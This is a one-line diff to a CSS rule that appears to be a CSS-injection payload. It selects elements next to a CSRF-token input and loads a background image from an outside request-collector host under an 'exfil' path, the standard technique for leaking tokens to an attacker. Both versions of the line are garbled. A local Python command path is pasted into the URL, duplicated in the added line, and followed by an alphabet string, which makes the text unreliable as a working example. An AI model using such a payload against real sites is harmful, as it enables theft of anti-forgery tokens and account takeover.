@@ -1,1 +1,1 @@
-input[name=csrf] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil//bin/python3 /home/coutand/Téléchargements/test/injection.pyABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789) }
+input[name=csrf] ~ * { background-image: url(https://eomtg1jcz48suc3.m.pipedream.net/exfil//bin/python3 /home/coutand/Téléchargements/test/injection.py/bin/python3 /home/coutand/Téléchargements/test/injection.pyABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789) }
